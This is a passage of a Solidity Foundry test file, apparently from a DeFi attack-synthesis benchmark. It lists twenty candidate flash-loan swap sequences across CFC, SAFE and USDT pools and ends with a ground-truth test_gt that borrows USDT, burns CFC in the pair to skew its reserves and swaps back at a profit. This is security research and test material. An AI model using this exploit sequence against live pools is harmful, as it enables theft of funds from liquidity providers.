        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
        swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
        swap_pair_attacker_cfc_safe(amt7, amt8);
        swap_safeusdtPair_attacker_safe_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand070(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
        swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
        swap_pair_attacker_cfc_safe(amt9, amt10);
        payback_safe_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand071(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        swap_pair_attacker_safe_cfc(amt5, amt6);
        swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
        swap_safeusdtPair_attacker_usdt_safe(amt9, amt10);
        payback_safe_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand072(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        swap_pair_attacker_cfc_safe(amt5, amt6);
        swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
        swap_safeusdtPair_attacker_usdt_safe(amt9, amt10);
        payback_safe_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand073(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        swap_pair_attacker_cfc_safe(amt5, amt6);
        swap_pair_attacker_safe_cfc(amt7, amt8);
        swap_pair_attacker_cfc_safe(amt9, amt10);
        payback_safe_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand074(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
        swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
        swap_pair_attacker_cfc_safe(amt9, amt10);
        payback_safe_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand075(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_safe_owner(amt0);
        swap_pair_attacker_safe_cfc(amt1, amt2);
        swap_pair_attacker_cfc_safe(amt3, amt4);
        swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
        swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
        swap_pair_attacker_cfc_safe(amt9, amt10);
        payback_safe_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand076(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_safe_owner(amt0);
        swap_pair_attacker_safe_cfc(amt1, amt2);
        swap_pair_attacker_cfc_safe(amt3, amt4);
        swap_pair_attacker_safe_cfc(amt5, amt6);
        swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
        swap_safeusdtPair_attacker_usdt_safe(amt9, amt10);
        payback_safe_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand077(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_safe_owner(amt0);
        swap_pair_attacker_safe_cfc(amt1, amt2);
        swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
        swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
        swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
        swap_safeusdtPair_attacker_usdt_safe(amt9, amt10);
        payback_safe_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand078(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_safe_owner(amt0);
        swap_pair_attacker_safe_cfc(amt1, amt2);
        swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
        swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
        swap_pair_attacker_safe_cfc(amt7, amt8);
        swap_pair_attacker_cfc_safe(amt9, amt10);
        payback_safe_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand079(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_safe_owner(amt0);
        swap_pair_attacker_safe_cfc(amt1, amt2);
        swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
        swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
        swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
        swap_safeusdtPair_attacker_usdt_safe(amt9, amt10);
        payback_safe_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand080(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_cfc_owner(amt0);
        swap_pair_attacker_cfc_safe(amt1, amt2);
        swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
        swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
        swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
        swap_usdtcfc_attacker_usdt_cfc(amt9, amt10);
        payback_cfc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand081(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_cfc_owner(amt0);
        swap_pair_attacker_cfc_safe(amt1, amt2);
        swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
        swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
        swap_pair_attacker_cfc_safe(amt7, amt8);
        swap_pair_attacker_safe_cfc(amt9, amt10);
        payback_cfc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand082(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_cfc_owner(amt0);
        swap_pair_attacker_cfc_safe(amt1, amt2);
        swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
        swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
        swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
        swap_usdtcfc_attacker_usdt_cfc(amt9, amt10);
        payback_cfc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand083(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_cfc_owner(amt0);
        swap_pair_attacker_cfc_safe(amt1, amt2);
        swap_pair_attacker_safe_cfc(amt3, amt4);
        swap_pair_attacker_cfc_safe(amt5, amt6);
        swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
        swap_usdtcfc_attacker_usdt_cfc(amt9, amt10);
        payback_cfc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand084(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_cfc_owner(amt0);
        swap_pair_attacker_cfc_safe(amt1, amt2);
        swap_pair_attacker_safe_cfc(amt3, amt4);
        swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
        swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
        swap_pair_attacker_safe_cfc(amt9, amt10);
        payback_cfc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand085(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
        swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
        swap_pair_attacker_safe_cfc(amt9, amt10);
        payback_cfc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand086(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        swap_pair_attacker_safe_cfc(amt5, amt6);
        swap_pair_attacker_cfc_safe(amt7, amt8);
        swap_pair_attacker_safe_cfc(amt9, amt10);
        payback_cfc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand087(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        swap_pair_attacker_safe_cfc(amt5, amt6);
        swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
        swap_usdtcfc_attacker_usdt_cfc(amt9, amt10);
        payback_cfc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand088(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        swap_pair_attacker_cfc_safe(amt5, amt6);
        swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
        swap_usdtcfc_attacker_usdt_cfc(amt9, amt10);
        payback_cfc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand089(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
        swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
        swap_pair_attacker_safe_cfc(amt9, amt10);
        payback_cfc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        emit log_named_uint("amt0", 57 * 1e22);
        borrow_usdt_owner(57 * 1e22);
        printBalance("After step0 ");
        emit log_named_uint("amt1", 13 * 1e21);
        emit log_named_uint(
            "amt2",
            safeusdtPair.getAmountOut(13 * 1e21, address(usdt))
        );
        swap_usdtcfc_attacker_usdt_cfc(
            13 * 1e21,
            safeusdtPair.getAmountOut(13 * 1e21, address(usdt))
        );
        printBalance("After step1 ");
        emit log_named_uint("amt3", 36000 ether);
        burn_cfc_pair(36000 ether);
        printBalance("After step2 ");
        emit log_named_uint("amt4", cfc.balanceOf(attacker));
        emit log_named_uint(
            "amt5",
            (pair.getAmountOut(cfc.balanceOf(attacker), address(cfc)) * 8) / 10
        );
        swap_usdtcfc_attacker_cfc_usdt(
            cfc.balanceOf(attacker),
            (pair.getAmountOut(cfc.balanceOf(attacker), address(cfc)) * 8) / 10
        );
        printBalance("After step3 ");
        emit log_named_uint("amt6", 57 * 1e22);
        payback_usdt_owner(57 * 1e22);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        burn_cfc_pair(amt3);
        swap_usdtcfc_attacker_cfc_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
